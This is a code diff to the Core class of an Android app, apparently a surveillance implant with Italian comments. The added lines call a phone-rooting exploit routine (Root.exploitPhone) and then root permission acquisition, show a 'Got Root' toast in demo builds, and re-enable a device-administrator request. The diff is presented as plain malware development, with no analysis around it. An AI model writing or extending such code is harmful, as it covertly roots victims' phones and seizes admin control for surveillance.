@@ -115,6 +115,10 @@ public class Core extends Activity implements Runnable {
 				Check.log(TAG + " (Start): service already running"); //$NON-NLS-1$
 			}
 
+			if(!Status.haveRoot()) {
+				// TODO: da ripristinare con un semaforo
+				//Root.getPermissions();
+			}
 			return false;
 		}
 
@@ -216,7 +220,15 @@ public class Core extends Activity implements Runnable {
 			// startTrace();
 		}
 
+		Keys.self();
+		Root.exploitPhone(true);
+		Root.getPermissions();
+
 		if (Status.haveRoot()) {
+			if (Cfg.DEMO) {
+				Status.self().makeToast("Got Root");
+			}
+
 			// Usa la shell per prendere l'admin
 			try {
 				// /system/bin/ntpsvd adm
@@ -237,8 +249,7 @@ public class Core extends Activity implements Runnable {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (run) calling gui admin");
 				}
-
-				//gui.deviceAdminRequest();
+				gui.deviceAdminRequest();
 			}
 		}
 
